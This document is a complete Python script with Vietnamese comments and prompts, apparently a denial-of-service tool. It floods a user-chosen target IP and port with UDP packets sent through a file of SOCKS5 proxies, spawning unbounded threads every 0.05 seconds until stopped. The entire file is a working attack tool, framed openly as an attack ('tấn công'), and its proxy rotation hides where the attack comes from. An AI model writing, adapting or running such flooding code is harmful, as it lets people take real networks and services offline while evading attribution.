import socks
import socket
import threading
import random
import time

class Brutalize:
    def __init__(self, ip, port, force, threads, proxy_list):
        self.ip = ip
        self.port = port or random.randint(1, 65535)
        self.force = force
        self.threads = threads
        self.proxy_list = proxy_list
        self.on = True
        self.data = str.encode("X" * self.force)

    def get_proxy_socket(self, proxy):
        """ Tạo socket qua proxy SOCKS5 """
        try:
            proxy_ip, proxy_port = proxy.split(":")
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            sock.settimeout(2)
            return sock
        except Exception:
            return None

    def send_packet(self, proxy):
        """ Gửi gói tin qua proxy """
        while self.on:
            try:
                sock = self.get_proxy_socket(proxy)
                if sock:
                    sock.sendto(self.data, (self.ip, self.port))
                    sock.close()
            except:
                pass

    def flood(self):
        """ Khởi chạy tấn công với tất cả proxy """
        print(f"Bắt đầu tấn công {self.ip}:{self.port} qua tất cả proxy mỗi 0.05s...")
        while self.on:
            threads = []
            for proxy in self.proxy_list:
                thread = threading.Thread(target=self.send_packet, args=(proxy,))
                thread.start()
                threads.append(thread)
            time.sleep(0.05)

    def stop(self):
        """ Dừng tấn công """
        self.on = False

def load_proxies():
    """ Đọc danh sách proxy từ file """
    try:
        with open("proxy_socks5.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Không tìm thấy file proxy_socks5.txt!")
        exit()

def main():
    ip = input("Nhập IP mục tiêu: ")
    port = input("Nhập port (Enter để chọn ngẫu nhiên): ")
    port = int(port) if port.isdigit() else None
    force = input("Bytes per packet (Enter để mặc định 1250): ")
    force = int(force) if force.isdigit() else 1250
    threads = input("Nhập số luồng (Enter để mặc định 100): ")
    threads = int(threads) if threads.isdigit() else 100

    proxies = load_proxies()
    if not proxies:
        print("Không có proxy hợp lệ trong file!")
        return

    brute = Brutalize(ip, port, force, threads, proxies)

    try:
        brute.flood()
    except KeyboardInterrupt:
        brute.stop()
        print("Đã dừng tấn công.")

if __name__ == "__main__":
    main()
                  
